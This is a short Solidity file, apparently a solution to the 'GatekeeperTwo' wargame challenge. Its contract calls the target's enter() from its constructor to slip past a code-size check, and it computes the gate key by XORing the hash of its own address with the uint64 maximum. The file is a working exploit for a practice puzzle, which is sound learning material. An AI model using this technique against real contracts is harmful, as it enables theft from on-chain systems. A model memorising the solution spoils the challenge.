// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./GatekeeperTwo.sol";

contract Pwn {

    GatekeeperTwo private target;
    
    constructor(address _target) {
        target = GatekeeperTwo(_target);

        uint64 s = uint64(bytes8(keccak256(abi.encodePacked(address(this)))));
        uint64 k = s ^ type(uint64).max;
        bytes8 key = bytes8(k);

        target.enter(key);
    }
}